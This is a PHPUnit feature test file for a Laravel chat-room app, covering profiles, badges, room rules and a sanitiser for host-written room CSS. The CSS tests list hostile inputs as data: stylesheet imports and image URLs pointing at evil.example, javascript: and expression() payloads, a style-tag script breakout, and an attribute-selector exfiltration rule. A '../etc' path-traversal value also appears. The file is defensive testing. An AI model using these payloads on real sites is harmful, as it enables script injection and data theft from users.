<?php

namespace Tests\Feature;

use App\Enums\Role;
use App\Events\RoomUpdated;
use App\Events\UserUpdated;
use App\Models\ChatMessage;
use App\Models\Friendship;
use App\Models\Room;
use App\Models\User;
use App\Support\Awards;
use App\Support\Countries;
use App\Support\RoomCss;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Event;
use Inertia\Testing\AssertableInertia as Assert;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

/** A flag, pronouns, a bio and a status on the profile, special badges, rules and CSS for a room, and everything showing up at once. */
class ProfileRoomExtrasTest extends TestCase
{
    use RefreshDatabase;

    private function owner(): User
    {
        $owner = User::factory()->create();
        $owner->forceFill(['roles' => ['owner']])->save();

        return $owner;
    }

    private function save(User $user, array $extra = [])
    {
        return $this->actingAs($user)->patch('/profile', $extra + ['username' => $user->username, 'name' => $user->name, 'email' => $user->email]);
    }

    private function room(?User $host = null): Room
    {
        return ($host ?? User::factory()->create())->rooms()->create(['name' => 'Lobby', 'slug' => 'lobby-x']);
    }

    private function source(string $file): string
    {
        return file_get_contents(base_path($file));
    }

    // ---------------------------------------------------------------- flag, pronouns, bio

    public function test_flag_pronouns_and_bio_are_saved_validated_and_shown(): void
    {
        $me = User::factory()->create();

        $this->save($me, ['country' => 'ee', 'pronouns' => 'she/her', 'bio' => "Line one\nLine two"])->assertSessionHasNoErrors();
        $me->refresh();
        $this->assertSame('ee', $me->country);
        $this->assertSame(['code' => 'ee', 'name' => 'Estonia'], $me->flag);
        $this->assertSame('she/her', $me->pronouns);
        $this->assertSame("Line one\nLine two", $me->bio);

        $this->save($me, ['country' => 'zz'])->assertSessionHasErrors('country');
        $this->save($me, ['country' => 'EE'])->assertSessionHasErrors('country'); // the codes are lower case
        $this->save($me, ['country' => '../etc'])->assertSessionHasErrors('country');
        $this->save($me, ['pronouns' => str_repeat('a', 25)])->assertSessionHasErrors('pronouns');
        $this->save($me, ['bio' => str_repeat('x', 501)])->assertSessionHasErrors('bio');
        $this->save($me, ['bio' => str_repeat('x', 500)])->assertSessionHasNoErrors();
        $this->assertSame('ee', $me->refresh()->country, 'a refused form changes nothing');

        // everybody can see them: on the page, and in the quick profile card
        $this->app['auth']->forgetGuards();
        $this->getJson("/api/users/{$me->id}")->assertJsonPath('flag', ['code' => 'ee', 'name' => 'Estonia'])->assertJsonPath('pronouns', 'she/her');
        $this->get("/users/{$me->id}")->assertInertia(fn (Assert $p) => $p->where('profile.flag.code', 'ee')->where('profile.pronouns', 'she/her'));

        // and no flag at all is fine
        $this->save($me, ['country' => '', 'pronouns' => ''])->assertSessionHasNoErrors();
        $me->refresh();
        $this->assertNull($me->country);
        $this->assertNull($me->flag);
        $this->assertNull($me->pronouns);
    }

    public function test_every_flag_on_the_list_has_its_picture_and_the_profile_form_gets_the_list(): void
    {
        $this->assertGreaterThan(240, count(Countries::ALL));
        $this->assertSame('Estonia', Countries::name('ee'));
        $this->assertNull(Countries::name('zz'));
        $this->assertNull(Countries::flag(null));

        foreach (array_keys(Countries::ALL) as $code) {
            $this->assertMatchesRegularExpression('/^[a-z]{2}(-[a-z]{2,3})?$/', $code);
            $this->assertFileExists(public_path("flags/{$code}.svg"), "no picture for {$code}");
        }
        $this->assertFileExists(public_path('flags/LICENSE.txt'));

        $this->actingAs(User::factory()->create())->get('/profile')->assertInertia(fn (Assert $p) => $p->component('Profile/Edit')->where('countries.ee', 'Estonia')->where('countries.gb', 'United Kingdom'));
    }

    // ---------------------------------------------------------------- status

    public function test_status_is_chosen_validated_and_shown_to_others_as_the_person_allows(): void
    {
        $me = User::factory()->create();
        $other = User::factory()->create();
        $this->assertSame('online', $me->refresh()->status, 'everybody starts online');
        $this->assertSame(['online', 'busy', 'away', 'offline'], User::STATUSES);

        $this->actingAs($me)->patch('/profile/status', ['status' => 'busy'])->assertSessionHasNoErrors();
        $this->assertSame('busy', $me->refresh()->status);
        $this->actingAs($me)->patch('/profile/status', ['status' => 'dancing'])->assertSessionHasErrors('status');
        $this->actingAs($me)->patch('/profile/status', [])->assertSessionHasErrors('status');
        $this->assertSame('busy', $me->refresh()->status);
        $this->app['auth']->forgetGuards();
        $this->patch('/profile/status', ['status' => 'away'])->assertRedirect('/login');

        $this->actingAs($other)->getJson("/api/users/{$me->id}")->assertJsonPath('status', 'busy');

        // offline: everybody else sees them offline
        $this->actingAs($me)->patch('/profile/status', ['status' => 'offline']);
        $this->actingAs($other)->getJson("/api/users/{$me->id}")->assertJsonPath('status', 'offline');

        // hiding the online status in the privacy settings does the same, and you still see what you chose
        $me->forceFill(['status' => 'away', 'preferences' => ['privacy' => ['show_online' => false]]])->save();
        $this->actingAs($other)->getJson("/api/users/{$me->id}")->assertJsonPath('status', 'offline');
        $this->actingAs($me)->getJson("/api/users/{$me->id}")->assertJsonPath('status', 'away');
    }

    public function test_friends_see_the_status_of_a_friend_who_is_around_and_nothing_of_one_who_is_offline(): void
    {
        $me = User::factory()->create();
        $busy = User::factory()->create(['status' => 'busy', 'last_seen_at' => now()]);
        $hidden = User::factory()->create(['status' => 'offline', 'last_seen_at' => now()]);
        Friendship::create(['user_id' => $me->id, 'friend_id' => $busy->id, 'status' => 'accepted']);
        Friendship::create(['user_id' => $me->id, 'friend_id' => $hidden->id, 'status' => 'accepted']);

        $this->actingAs($me)->get('/friends')->assertInertia(fn (Assert $p) => $p
            ->where('friends.0.user_id', $busy->id)->where('friends.0.online', true)->where('friends.0.status', 'busy')
            ->where('friends.1.user_id', $hidden->id)->where('friends.1.online', false)->where('friends.1.status', 'offline'));
    }

    public function test_the_room_is_told_about_a_status_flag_or_shop_change_in_every_room_the_person_is_in(): void
    {
        Event::fake([UserUpdated::class]);
        $me = User::factory()->create();
        $own = $this->actingAs($me);

        // not in a room: nobody to tell
        $own->patch('/profile/status', ['status' => 'away']);
        Event::assertNotDispatched(UserUpdated::class);

        // in two rooms (two tabs): both are told, with what the room needs to draw them
        Cache::put('room_user_rooms', [$me->id => [7, 9]], 60);
        $own->patch('/profile/status', ['status' => 'busy']);
        Event::assertDispatchedTimes(UserUpdated::class, 2);
        Event::assertDispatched(UserUpdated::class, fn (UserUpdated $e) => $e->roomId === 7 && $e->member['id'] === $me->id && $e->member['status'] === 'busy');
        Event::assertDispatched(UserUpdated::class, fn (UserUpdated $e) => $e->roomId === 9);

        // a flag and a name
        $this->save($me, ['country' => 'fi', 'name' => 'Kati']);
        Event::assertDispatched(UserUpdated::class, fn (UserUpdated $e) => $e->roomId === 7 && ($e->member['flag']['code'] ?? null) === 'fi' && $e->member['name'] === 'Kati');

        // putting something on in the shop
        $me->forceFill(['xp' => 20 * 9 ** 2, 'coins' => 1000])->save(); // level 10
        $own->post('/shop/buy', ['items' => [['slot' => 'accessory', 'key' => 'visor']]]);
        $own->post('/shop/outfit', ['accessory' => 'visor', 'badge' => 'rookie']);
        Event::assertDispatched(UserUpdated::class, fn (UserUpdated $e) => $e->roomId === 9 && ($e->member['cosmetics']['accessory'] ?? null) === 'visor');
        $own->post('/shop/cosmetic', ['slot' => 'frame', 'key' => null]);
        $own->post('/shop/equip', ['avatar' => 'char:foxy']);
        $own->post('/shop/daily');
        $own->delete('/profile/photo');

        // and when staff hand out a special badge
        $this->actingAs($this->owner())->patch("/admin/users/{$me->id}/awards", ['awards' => ['beta']]);
        Event::assertDispatched(UserUpdated::class, fn (UserUpdated $e) => $e->roomId === 7 && collect($e->member['badges'])->contains('key', 'award:beta'));

        // somebody who is in no room of ours is never told about
        Event::assertNotDispatched(UserUpdated::class, fn (UserUpdated $e) => $e->roomId === 8);
    }

    public function test_a_room_knows_what_it_needs_about_somebody_who_comes_in(): void
    {
        $me = User::factory()->create(['country' => 'ee', 'status' => 'busy']);
        $info = $me->presenceInfo();

        $this->assertSame(['id', 'name', 'username', 'avatar', 'character', 'cosmetics', 'role', 'badges', 'level', 'flag', 'status'], array_keys($info));
        $this->assertSame('char:foxy', $info['character']);
        $this->assertSame('ee', $info['flag']['code']);
        $this->assertSame('busy', $info['status']);
        $this->assertSame('offline', User::factory()->create(['status' => 'offline'])->presenceInfo()['status']);
    }

    // ---------------------------------------------------------------- special badges

    public function test_staff_give_and_take_special_badges_and_they_show_in_front_of_the_name(): void
    {
        $owner = $this->owner();
        $person = User::factory()->create();

        $this->actingAs(User::factory()->create())->patch("/admin/users/{$person->id}/awards", ['awards' => ['beta']])->assertForbidden();
        $this->assertNull($person->refresh()->awards);

        $this->actingAs($owner)->patch("/admin/users/{$person->id}/awards", ['awards' => ['hero', 'beta', 'beta', 'bughunter']])->assertSessionHasNoErrors();
        $this->assertSame(['beta', 'bughunter', 'hero'], $person->refresh()->awards, 'each one once, always in the same order');
        $this->actingAs($owner)->patch("/admin/users/{$person->id}/awards", ['awards' => ['nonsense']])->assertSessionHasErrors('awards.0');
        $this->actingAs($owner)->patch("/admin/users/{$person->id}/awards", [])->assertSessionHasErrors('awards');

        $keys = collect($person->refresh()->badges)->pluck('key')->all();
        $this->assertSame(['award:beta', 'award:bughunter', 'award:hero'], array_values(array_filter($keys, fn ($k) => str_starts_with($k, 'award:'))));
        $beta = collect($person->badges)->firstWhere('key', 'award:beta');
        $this->assertSame('Beta Tester', $beta['label']);
        $this->assertNotEmpty($beta['text']);
        $this->assertNull($beta['icon'], 'the page draws it');

        $this->app['auth']->forgetGuards();
        $this->getJson("/api/users/{$person->id}")->assertJsonCount(3, 'awards')->assertJsonPath('awards.0.label', 'Beta Tester');

        $this->actingAs($owner)->patch("/admin/users/{$person->id}/awards", ['awards' => []]);
        $this->assertNull($person->refresh()->awards);
        $this->assertSame([], array_values(array_filter(collect($person->badges)->pluck('key')->all(), fn ($k) => str_starts_with($k, 'award:'))));

        // the admin page lists them
        $this->actingAs($owner)->get('/admin')->assertInertia(fn (Assert $p) => $p->has('awardList', count(Awards::ALL))->where('awardList.0.key', 'beta')->has('users.data.0.awards'));
    }

    public function test_the_beta_tester_role_became_the_badge_for_everybody_and_chat_shows_it(): void
    {
        $person = User::factory()->create();
        $person->forceFill(['roles' => ['beta_tester', 'vip'], 'awards' => ['hero']])->save();
        $newer = User::factory()->create();
        $newer->forceFill(['roles' => ['beta_tester'], 'awards' => null])->save();
        $bot = User::factory()->create(['is_bot' => true]);
        $bot->forceFill(['roles' => ['beta_tester']])->save();

        (require database_path('migrations/2026_11_07_000001_replace_the_beta_tester_role_with_the_badge.php'))->up();

        $this->assertSame([['vip'], ['beta', 'hero']], [$person->refresh()->roles, $person->awards]);
        $this->assertSame([[], ['beta']], [$newer->refresh()->roles, $newer->awards]);
        $this->assertSame([[], null], [$bot->refresh()->roles, $bot->awards], 'a bot only loses the role');
        $this->assertNull(Role::tryFrom('beta_tester'));

        // the badge is drawn in front of the name, also on a chat line (which loads only some columns of the person)
        $room = $person->rooms()->create(['name' => 'Badges', 'slug' => 'badges']);
        $room->messages()->create(['user_id' => $newer->id, 'body' => 'hi']);
        $this->assertContains('award:beta', collect($room->messages()->with(ChatMessage::WITH_USER)->first()->user->badges)->pluck('key')->all());
    }

    public function test_every_award_is_drawn_and_has_a_name_and_a_meaning(): void
    {
        // the pictures: one for every key (resources/js/lib/art/awards.tsx), and nothing drawn that does not exist
        preg_match_all("/^    ([a-z]+): \['#/m", $this->source('resources/js/lib/art/awards.tsx'), $drawn);
        $this->assertEqualsCanonicalizing(array_keys(Awards::ALL), $drawn[1]);
        preg_match_all('/^    ([a-z]+): \(c(?:, a)?\) =>/m', $this->source('resources/js/lib/art/awards.tsx'), $signs);
        $this->assertEqualsCanonicalizing(array_keys(Awards::ALL), $signs[1]);

        foreach (Awards::ALL as [$label, $text, $color]) {
            $this->assertNotSame('', $label);
            $this->assertGreaterThan(20, strlen($text));
            $this->assertMatchesRegularExpression('/^#[0-9a-f]{6}$/', $color);
        }
        $this->assertNull(Awards::badge('nonsense'));
        $this->assertSame(['beta', 'hero'], Awards::clean(['hero', 'x', 'beta']));
    }

    // ---------------------------------------------------------------- room rules

    public function test_the_host_writes_the_rules_people_read_when_they_come_in(): void
    {
        Event::fake([RoomUpdated::class]);
        $host = User::factory()->create();
        $room = $this->room($host);
        $visitor = User::factory()->create();

        $this->actingAs($visitor)->get("/rooms/{$room->slug}")->assertInertia(fn (Assert $p) => $p->where('room.rule_list', null));
        $this->actingAs($visitor)->put("/rooms/{$room->slug}/rules", ['rules' => [['title' => 'No', 'text' => '']]])->assertForbidden();

        $this->actingAs($host)->put("/rooms/{$room->slug}/rules", ['rules' => [
            ['title' => '  Be polite  ', 'text' => 'No bad words or you get banned.'],
            ['title' => 'Questions?', 'text' => null],
        ]])->assertSessionHasNoErrors();
        $room->refresh();
        $this->assertSame([['title' => 'Be polite', 'text' => 'No bad words or you get banned.'], ['title' => 'Questions?', 'text' => '']], $room->rule_list);
        $this->assertSame("1. Be polite: No bad words or you get banned.\n2. Questions?", $room->rules, 'the old text is kept in step for bots');
        Event::assertDispatched(RoomUpdated::class, fn (RoomUpdated $e) => $e->roomId === $room->id);

        // everybody gets them: members and guests
        $this->actingAs($visitor)->get("/rooms/{$room->slug}")->assertInertia(fn (Assert $p) => $p->where('room.rule_list.0.title', 'Be polite')->has('room.rule_list', 2));
        $this->app['auth']->forgetGuards();
        $this->get("/rooms/{$room->slug}")->assertInertia(fn (Assert $p) => $p->where('room.rule_list.1.title', 'Questions?'));
        $this->actingAs($visitor, 'sanctum')->getJson("/api/v1/rooms/{$room->slug}")->assertJsonPath('rules', "1. Be polite: No bad words or you get banned.\n2. Questions?")->assertJsonPath('rule_list.0.title', 'Be polite');

        // none at all
        $this->actingAs($host)->put("/rooms/{$room->slug}/rules", ['rules' => []])->assertSessionHasNoErrors();
        $this->assertNull($room->refresh()->rule_list);
        $this->assertNull($room->rules);
    }

    public function test_the_rules_have_limits_and_need_the_right_to_edit_settings(): void
    {
        $host = User::factory()->create();
        $room = $this->room($host);
        $put = fn (array $rules) => $this->actingAs($host)->put("/rooms/{$room->slug}/rules", ['rules' => $rules]);

        $put(array_fill(0, 11, ['title' => 'x', 'text' => '']))->assertSessionHasErrors('rules');
        $put(array_fill(0, 10, ['title' => 'x', 'text' => '']))->assertSessionHasNoErrors();
        $put([['title' => str_repeat('t', 61), 'text' => '']])->assertSessionHasErrors('rules.0.title');
        $put([['title' => 'ok', 'text' => str_repeat('t', 501)]])->assertSessionHasErrors('rules.0.text');
        $put([['text' => 'no title']])->assertSessionHasErrors('rules.0.title');
        $this->actingAs($host)->put("/rooms/{$room->slug}/rules", [])->assertSessionHasErrors('rules');

        // a manager (may edit settings) may write them, a bouncer may not
        $manager = User::factory()->create();
        $bouncer = User::factory()->create();
        $room->members()->create(['user_id' => $manager->id, 'room_role_id' => $room->roles()->where('name', 'Manager')->value('id')]);
        $room->members()->create(['user_id' => $bouncer->id, 'room_role_id' => $room->roles()->where('name', 'Bouncer')->value('id')]);
        $this->actingAs($manager)->put("/rooms/{$room->slug}/rules", ['rules' => [['title' => 'Mine', 'text' => '']]])->assertSessionHasNoErrors();
        $this->assertSame('Mine', $room->refresh()->rule_list[0]['title']);
        $this->actingAs($bouncer)->put("/rooms/{$room->slug}/rules", ['rules' => [['title' => 'Nope', 'text' => '']]])->assertForbidden();
    }

    // ---------------------------------------------------------------- room CSS

    public function test_the_host_writes_css_and_everybody_gets_only_the_harmless_part_of_it(): void
    {
        Event::fake([RoomUpdated::class]);
        $host = User::factory()->create();
        $room = $this->room($host);
        $visitor = User::factory()->create();

        $css = ".sfd-chat { background: #111; }\n.sfd-chat { background-image: url(http://evil.example/x.png); }\n@import url(//evil.example/a.css);";
        $this->actingAs($host)->put("/rooms/{$room->slug}/css", ['css' => $css])->assertSessionHasNoErrors();
        $this->assertSame($css, $room->refresh()->custom_css, 'what was typed is kept as it is');
        Event::assertDispatched(RoomUpdated::class);

        // the host sees what was typed and what was left out
        $this->actingAs($host)->get("/rooms/{$room->slug}")->assertInertia(fn (Assert $p) => $p
            ->where('room.css', '.sfd-room .sfd-chat{background:#111}')->where('room.css_source', $css)->has('room.css_notes', 2));

        // everybody else gets the clean one and never the source
        $this->actingAs($visitor)->get("/rooms/{$room->slug}")->assertInertia(fn (Assert $p) => $p->where('room.css', '.sfd-room .sfd-chat{background:#111}')->missing('room.css_source')->missing('room.css_notes'));
        $this->app['auth']->forgetGuards();
        $this->get("/rooms/{$room->slug}")->assertInertia(fn (Assert $p) => $p->where('room.css', '.sfd-room .sfd-chat{background:#111}')->missing('room.css_source'));

        // taking it away
        $this->actingAs($host)->put("/rooms/{$room->slug}/css", ['css' => ''])->assertSessionHasNoErrors();
        $this->assertNull($room->refresh()->custom_css);
        $this->actingAs($host)->get("/rooms/{$room->slug}")->assertInertia(fn (Assert $p) => $p->where('room.css', ''));
    }

    public function test_only_the_host_and_staff_write_css_and_it_has_a_size_limit(): void
    {
        $host = User::factory()->create();
        $room = $this->room($host);
        $manager = User::factory()->create();
        $room->members()->create(['user_id' => $manager->id, 'room_role_id' => $room->roles()->where('name', 'Co-Host')->value('id')]);

        $this->actingAs($manager)->put("/rooms/{$room->slug}/css", ['css' => '.sfd-chat{color:red}'])->assertForbidden(); // even a co-host
        $this->actingAs(User::factory()->create())->put("/rooms/{$room->slug}/css", ['css' => '.sfd-chat{color:red}'])->assertForbidden();
        $this->app['auth']->forgetGuards();
        $this->put("/rooms/{$room->slug}/css", ['css' => '.sfd-chat{color:red}'])->assertRedirect('/login');
        $this->assertNull($room->refresh()->custom_css);

        $this->actingAs($host)->put("/rooms/{$room->slug}/css", ['css' => str_repeat('a', 20001)])->assertSessionHasErrors('css');
        $this->actingAs($this->owner())->put("/rooms/{$room->slug}/css", ['css' => '.sfd-chat{color:red}'])->assertSessionHasNoErrors();
        $this->assertSame('.sfd-chat{color:red}', $room->refresh()->custom_css);
    }

    #[DataProvider('harmfulCss')]
    public function test_nothing_harmful_gets_through_the_css_cleaner(string $css): void
    {
        $clean = RoomCss::clean($css)['css'];

        $this->assertDoesNotMatchRegularExpression('/@import|@font-face|expression|javascript|vbscript|behavior|binding|<|\\\\|position\s*:\s*(fixed|sticky)|url\s*\(\s*[\'"]?(?!https:\/\/|\/(?!\/))/i', $clean, "kept: {$clean}");
        $this->assertDoesNotMatchRegularExpression('/\[|#[a-z]/i', preg_replace('/#[0-9a-f]{3,8}\b/i', '', $clean), "an id or attribute selector got through: {$clean}");

        // every rule is inside the room
        $rules = preg_replace('/@keyframes[^{]*\{(?:[^{}]*\{[^{}]*\})*\}/', '', $clean);
        foreach (preg_split('/\}/', preg_replace('/@media[^{]*\{/', '', $rules)) as $rule) {
            if (trim($rule) !== '') {
                $this->assertStringStartsWith('.sfd-room', trim($rule, "{ \n"), "a rule outside the room: {$rule}");
            }
        }
    }

    public static function harmfulCss(): array
    {
        return [
            'import' => ['@import url("https://evil.example/a.css"); .sfd-chat{color:red}'],
            'font' => ['@font-face{font-family:x;src:url(https://evil.example/f.woff)} .sfd-chat{font-family:x}'],
            'http picture' => ['.sfd-chat{background:url(http://evil.example/p.png)}'],
            'protocol-less picture' => ['.sfd-chat{background:url(//evil.example/p.png)}'],
            'javascript' => ['.sfd-chat{background:url(javascript:alert(1))}'],
            'data picture' => ['.sfd-chat{background:url(data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=)}'],
            'expression' => ['.sfd-chat{width:expression(alert(1))}'],
            'binding' => ['.sfd-chat{-moz-binding:url(https://evil.example/x.xml#b);behavior:url(x.htc)}'],
            'escaped url' => ['.sfd-chat{background:\\75 rl(http://evil.example/p.png)}'],
            'escaped word' => ['.sfd-chat{color:expr\\65ssion(1)}'],
            'style tag' => ['</style><script>alert(1)</script> .sfd-chat{color:red}'],
            'style tag in a value' => ['.sfd-chat{content:"</style><script>alert(1)</script>"}'],
            'fixed cover' => ['.sfd-chat{position:fixed;inset:0;z-index:99999}'],
            'sticky' => ['.sfd-chat{position: sticky}'],
            'attribute selector' => ['input[value^="a"]{background:url(https://evil.example/a)}'],
            'attribute on a hook' => ['.sfd-chat[data-x]{color:red}'],
            'id' => ['#app{display:none}'],
            'tag only' => ['aside{display:none} nav{display:none} button{display:none}'],
            'tag below the page' => ['body aside{display:none} .sfd-room > aside{display:none}'],
            'is and has' => ['.sfd-chat:is(aside){display:none} .sfd-chat:has(a){display:none} :where(aside){display:none}'],
            'unknown pseudo' => ['.sfd-chat:-moz-any(aside){display:none}'],
            'html comment' => ['<!-- .sfd-chat{color:red} -->'],
            'nesting' => ['.sfd-chat { aside { display:none } }'],
            'unterminated' => ['.sfd-chat{background:url(https://evil.example/a.png'],
            'unterminated string' => ['.sfd-chat{content:"abc} aside{display:none}'],
            'supports' => ['@supports (display:grid){ aside{display:none} }'],
            'container and layer' => ['@layer x{ aside{display:none} } @container (min-width:1px){ aside{display:none} }'],
            'page' => ['@page{margin:0} @charset "x"; @namespace url(x);'],
            'media with a tag' => ['@media (min-width:1px){ aside{display:none} }'],
            'media with junk' => ['@media screen{ .sfd-chat{color:red} } @media (x) and {}{ aside{display:none} }'],
            'keyframes with url' => ['@keyframes a{from{background:url(http://evil.example/x)}to{color:red}}'],
            'important tricks' => ['.sfd-chat{color:red ! important;position:fixed ! important}'],
            'uppercase' => ['.SFD-CHAT{COLOR:RED} ASIDE{DISPLAY:NONE} .sfd-chat{POSITION:FIXED}'],
        ];
    }

    public function test_the_css_cleaner_keeps_what_a_room_needs(): void
    {
        $css = <<<'CSS'
        body { background: url("https://cdn.example/bg.jpg") center / cover; }
        .sfd-navbar, .sfd-footbar { background: rgba(255,255,255,.07); backdrop-filter: blur(14px); }
        .sfd-chat > .sfd-message:nth-child(2n+1) a:hover { color: #f0f !important; }
        .sfd-avatar::after { content: "★"; }
        .sfd-votes { animation: beat .6s ease-in-out infinite alternate; }
        @keyframes beat { from { transform: scale(1) } to { transform: scale(1.05) } }
        @media (max-width: 900px) { .sfd-panel { display: none } }
        :root { --accent: #d946ef; --pic: url(/media/room/x.png); }
        body * { font-family: Georgia, serif; }
        CSS;
        $r = RoomCss::clean($css);

        $this->assertSame([], $r['notes']);
        foreach ([
            '.sfd-room{background:url("https://cdn.example/bg.jpg") center / cover}',
            '.sfd-room .sfd-navbar,.sfd-room .sfd-footbar{background:rgba(255,255,255,.07);backdrop-filter:blur(14px)}',
            '.sfd-room .sfd-chat > .sfd-message:nth-child(2n+1) a:hover{color:#f0f!important}',
            '.sfd-room .sfd-avatar::after{content:"★"}',
            '.sfd-room .sfd-votes{animation:rc-beat .6s ease-in-out infinite alternate}', // the animation is the room's own
            '@keyframes rc-beat{from{transform:scale(1)}to{transform:scale(1.05)}}',
            '@media (max-width: 900px){.sfd-room .sfd-panel{display:none}}',
            '.sfd-room{--accent:#d946ef;--pic:url(/media/room/x.png)}',
            '.sfd-room *{font-family:Georgia, serif}',
        ] as $part) {
            $this->assertStringContainsString($part, $r['css']);
        }

        $this->assertSame(['css' => '', 'notes' => []], RoomCss::clean(null));
        $this->assertSame(['css' => '', 'notes' => []], RoomCss::clean("  \n "));
        $this->assertNotEmpty(RoomCss::clean('.sfd-nothing{color:red}')['notes'], 'it says what it left out');
        $long = RoomCss::clean(str_repeat('.sfd-chat{color:red}', 5000));
        $this->assertLessThan(10000, strlen($long['css']), 'a long sheet is cut');
        $this->assertContains('Only the first 300 rules are used.', $long['notes']);
    }

    public function test_vote_theme_selectors_map_to_buttons_without_allowing_other_attributes(): void
    {
        foreach (['woot', 'grab', 'meh'] as $vote) {
            foreach ([".{$vote}", "[class*=\"{$vote}\"]", "[class*='{$vote}']"] as $target) {
                $result = RoomCss::clean(".sfd-votes {$target}:hover{color:red}");
                $this->assertSame([], $result['notes']);
                $this->assertSame(".sfd-room .sfd-votes .sfd-{$vote}:hover{color:red}", $result['css']);
            }
        }
        foreach (['.sfd-votes [class*="woot-extra"]', '.sfd-votes [data-vote="woot"]', '.sfd-votes [class*="woot"][value^="a"]'] as $selector) {
            $this->assertSame('', RoomCss::clean($selector.'{color:red}')['css']);
        }
        $result = RoomCss::clean('.sfd-playlists .sfd-playlist:hover{color:red}.sfd-playlistcontent .sfd-tracks .sfd-track{color:blue}');
        $this->assertSame([], $result['notes']);
        $this->assertStringContainsString('.sfd-room .sfd-playlists .sfd-playlist:hover', $result['css']);
        $this->assertStringContainsString('.sfd-room .sfd-playlistcontent .sfd-tracks .sfd-track', $result['css']);
    }

    public function test_history_uses_only_the_selected_visible_rooms_cleaned_css(): void
    {
        $host = User::factory()->create();
        $room = $host->rooms()->create(['name' => 'History theme', 'slug' => 'history-theme', 'custom_css' => '.sfd-history{color:red} aside{display:none}', 'is_private' => false]);
        $this->actingAs($host)->get('/history?room='.$room->slug)->assertInertia(fn (Assert $p) => $p
            ->component('History')->where('room_css', '.sfd-room .sfd-history{color:red}'));
        $this->get('/history')->assertInertia(fn (Assert $p) => $p->where('room_css', ''));
    }

    public function test_room_links_selection_video_and_history_selectors_are_supported(): void
    {
        foreach (['.sfd-room ::selection', '.sfd-room a', '.sfd-room a:hover', '.sfd-stage video', '.sfd-history', '.sfd-historylist', '.sfd-historyitem:hover'] as $selector) {
            $result = RoomCss::clean($selector.'{color:red}');
            $this->assertSame([], $result['notes'], $selector);
            $this->assertStringContainsString($selector.'{color:red}', $result['css']);
        }
        foreach (['.sfd-room aside', '.sfd-room a[data-secret]'] as $selector) {
            $this->assertSame('', RoomCss::clean($selector.'{color:red}')['css']);
        }
    }

    public function test_volume_slider_theme_supports_both_browser_thumb_and_track_selectors(): void
    {
        foreach (['-webkit-slider-thumb', '-webkit-slider-runnable-track', '-moz-range-thumb', '-moz-range-track', '-moz-range-progress'] as $pseudo) {
            $selector = '.sfd-volumeslider::'.$pseudo;
            $result = RoomCss::clean($selector.'{background:cyan}');
            $this->assertSame([], $result['notes']);
            $this->assertSame('.sfd-room '.$selector.'{background:cyan}', $result['css']);
        }
        $result = RoomCss::clean('.sfd-volume{--volume-fill:#22d3ee;--volume-track:#164e63;--volume-thumb:white;--volume-glow:cyan}');
        $this->assertSame([], $result['notes']);
        $this->assertStringContainsString('--volume-fill:#22d3ee', $result['css']);
    }

    public function test_navigation_theme_aliases_map_to_the_existing_hooks(): void
    {
        foreach (['sfd-navmenu' => 'sfd-menu', 'sfd-profile' => 'sfd-menuprofile'] as $alias => $hook) {
            foreach (['', ':hover', ':focus-visible'] as $pseudo) {
                $result = RoomCss::clean(".{$alias}{$pseudo}{color:red}");
                $this->assertSame([], $result['notes']);
                $this->assertSame(".sfd-room .{$hook}{$pseudo}{color:red}", $result['css']);
            }
        }
        $result = RoomCss::clean('.sfd-navmenu .sfd-profile:hover{color:red}');
        $this->assertSame([], $result['notes']);
        $this->assertSame('.sfd-room .sfd-menu .sfd-menuprofile:hover{color:red}', $result['css']);
        foreach (['.sfd-navmenu-extra', '.sfd-profile-extra', '.sfd-profile[data-x]', '.sfd-navmenu:has(a)'] as $selector) {
            $this->assertSame('', RoomCss::clean($selector.'{color:red}')['css']);
        }
    }

    public function test_playback_and_booth_css_can_style_states_and_svg_parts(): void
    {
        foreach (['.sfd-playback:hover', '.sfd-playbackon', '.sfd-playbackoff', '.sfd-playbackscreen iframe', '.sfd-booth', '.sfd-boothfront', '.sfd-boothtop', '.sfd-boothlights', '.sfd-boothdeck circle', '.sfd-boothmixer', '.sfd-booth g > rect'] as $selector) {
            $result = RoomCss::clean($selector.'{fill:#22d3ee}');
            $this->assertSame([], $result['notes'], $selector);
            $this->assertSame('.sfd-room '.$selector.'{fill:#22d3ee}', $result['css']);
        }
        foreach (['svg', 'g', 'rect', '.sfd-booth rect[data-x]', '.sfd-booth #app'] as $selector) {
            $this->assertSame('', RoomCss::clean($selector.'{fill:red}')['css']);
        }
    }

    public function test_legacy_chat_selectors_use_the_real_message_hook(): void
    {
        foreach (['chat-message', 'message-bubble'] as $alias) {
            foreach (['', ':hover'] as $pseudo) {
                $result = RoomCss::clean(".sfd-chat .{$alias}{$pseudo}{color:red}");
                $this->assertSame([], $result['notes']);
                $this->assertSame(".sfd-room .sfd-chat .sfd-message{$pseudo}{color:red}", $result['css']);
            }
        }

        foreach (['.sfd-chat .chat-message-extra', '.sfd-chat .message-bubble[data-x]', '.chat-message:has(a)'] as $selector) {
            $result = RoomCss::clean($selector.'{color:red}');
            $this->assertSame('', $result['css']);
            $this->assertNotEmpty($result['notes']);
        }
    }

    public function test_the_css_hooks_are_the_same_on_the_server_and_in_the_editor_and_are_all_on_the_page(): void
    {
        preg_match_all("/^    \['([a-z]+)', '/m", $this->source('resources/js/lib/cssHooks.ts'), $listed);
        $this->assertEqualsCanonicalizing(array_keys(RoomCss::HOOKS), $listed[1], 'the list in lib/cssHooks.ts must be the one in App\Support\RoomCss');

        // every class is really on an element of the room page
        $pages = collect(['Components/PlaybackFrame.tsx', 'Components/scene/DjBooth.tsx', 'Components/AudioEqualizer.tsx', 'Components/Sidebar.tsx', 'Components/ContextMenu.tsx', 'Pages/History.tsx', 'Pages/Room.tsx', 'Components/RoomHeader.tsx', 'Components/RoomScene.tsx', 'Components/RoomFootbar.tsx', 'Components/ChatPanel.tsx', 'Components/PlaylistManager.tsx', 'Components/playlists/TrackList.tsx', 'Components/VoteBar.tsx', 'Components/WaitlistCard.tsx', 'Components/Avatar.tsx'])
            ->map(fn ($f) => $this->source("resources/js/{$f}"))->implode("\n");
        foreach (array_keys(RoomCss::HOOKS) as $hook) {
            $this->assertStringContainsString("sfd-{$hook} ", $pages, "nothing on the page has .sfd-{$hook}");
        }
        $this->assertStringContainsString('data-room-css', $this->source('resources/js/Pages/Room.tsx'));
    }

    // ---------------------------------------------------------------- the pages

    public function test_the_words_and_pieces_are_on_the_pages(): void
    {
        $room = $this->source('resources/js/Pages/Room.tsx');
